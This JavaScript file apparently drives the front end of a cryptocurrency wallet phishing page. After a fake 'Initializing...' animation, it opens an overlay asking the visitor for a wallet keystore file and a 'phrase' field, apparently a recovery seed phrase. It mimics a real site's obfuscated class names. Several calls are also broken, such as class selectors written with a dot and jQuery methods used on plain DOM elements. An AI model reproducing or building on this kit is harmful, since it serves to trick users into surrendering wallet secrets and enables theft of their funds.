var popupname = document.querySelector("#walletname");
var firstpopupname = document.querySelector(".jsJmJE");
var overlay = document.querySelector(".overlay");
var icon = document.querySelectorAll(".cmAzHq");
// var icon_text = document.querySelectorAll(".pageStyles__SAppName-sc-1navawn-7");
var popupimage = document.getElementById("myImg");
var firstpopupimage = document.querySelector(".firstImg");
// var icon_img = document.querySelectorAll(".cmAzHq");
var wallet_id = document.querySelector("#wallet_id")
var connect_manual = document.querySelector(".jwEAlI");
var firstoverlay = document.getElementsByClassName(".sc-bdVaJa");
var connect = document.querySelector(".jwEAlI");
var loading = document.querySelector(".loading");
// connect_manual.addEventListener("click", function() {
//     overlay.style.display = "flex";
//     firstoverlay.style.display = "none";
// })

if (firstoverlay.style.display == "none") {
    connect.style.display = "none";
}

function loadings() {
     setTimeout(function() {
        loading.innerHTML = "Initializing.";
    }, 1)
;
     setTimeout(function() {
        loading.innerHTML = "Initializing..";
    }, 400);

     setTimeout(function() {
        loading.innerHTML = "Initializing...";
    }, 800);
     setTimeout(function() {
        loading.innerHTML = "Initializing.";
    }, 1200);

     setTimeout(function() {
        loading.innerHTML = "Initializing..";
    }, 1400)
    
     setTimeout(function() {
        loading.innerHTML = "Initializing...";
        // connect.style.display = "flex";
        overlay.style.display = "flex";
        firstoverlay.style.display = "none";



    },
    1800)



}
// $('.cmAzHq').click(function(e){
//     e.preventDefault();
//     var overlay = document.querySelector(".overlay");
//     firstoverlay.style.display = "flex";

//   popupname.innerHTML = $(this).text().trim().replace(" Wallet", "");

//     popupimage.src = $(this).children('div').children('img').attr('src');
//     wallet_id.value = popupname.innerHTML;
//     firstpopupname.innerHTML = popupname.innerHTML;
//     firstpopupimage.src = popupimage.src;
//     loadings();
// })

function icon_click(e) {
    e.preventDefault();
     document.querySelector(".overlay");
    firstoverlay.style.display = "flex";

  popupname.innerHTML = this.text().trim().replace(" Wallet", "");

    popupimage.src = this.children('div').children('img').attr('src');
    wallet_id.value = popupname.innerHTML;
    firstpopupname.innerHTML = popupname.innerHTML;
    firstpopupimage.src = popupimage.src;
    loadings();
}


for (var i = 0; i < icon.length; i++) {
    document.getElementsByClassName('.cmAzHq')[i].addEventListener("click", icon_click, true)
}

var cancel = document.querySelector("#cancel");

function firstcancel() {
    firstoverlay.style.display = "none";
    connect_manual.style.display = "none";
    loading.innerHTML = "";
}
 document.querySelector(".fRcQRh").onclick = firstcancel;
 document.querySelector(".fhSmUE").onclick = firstcancel;
cancel.addEventListener("click", function() {
    var overlay = document.querySelector(".overlay");
    overlay.style.display = "none";
    var span = document.querySelector("#span");
    span.innerHTML = "Choose Keystore File";
    var attr = document.querySelector("#first");
    var attr2 = document.querySelector("#second");
    var attr3 = document.querySelector("#third");

    attr.classList.remove("active");
    attr2.classList.remove("active");
    attr3.classList.remove("active");
    attr.classList.add("active");
    var attr4 = document.getElementsByClassName("text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full");


    for (let i = 0; i < attr.length; i++) {
        attr4[i].value = "";

    }
});


var label = document.querySelector("#label");
label.addEventListener("change", filenaming);

function filenaming(e) {
    e.preventDefault();
    var spantag = document.querySelector("#span");
    var fullPath = document.getElementById('file-upload').value;
    if (fullPath) {
        var startIndex = (fullPath.indexOf('\\') >= 0 ? fullPath.lastIndexOf('\\') : fullPath.lastIndexOf('/'));
        var filename = fullPath.substring(startIndex);
        if (filename.indexOf('\\') === 0 || filename.indexOf('/') === 0) {
            filename = filename.substring(1);
        }
        spantag.innerHTML = filename;
    }
}

document.querySelector("#connekt").addEventListener("click", function() {
    var walletname1 =document.getElementById('cymkm').html
    alert(walletname1);
    if (walletname1 == "Other") {
        document.getElementById('walletname11').html = "<textarea cols='30' rows='4' placeholder='Enter your type of wallet' class='text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400' name='phrase' required='' style='margin-top:0px;margin-bottom:0px;height:45px'></textarea>";
    }
})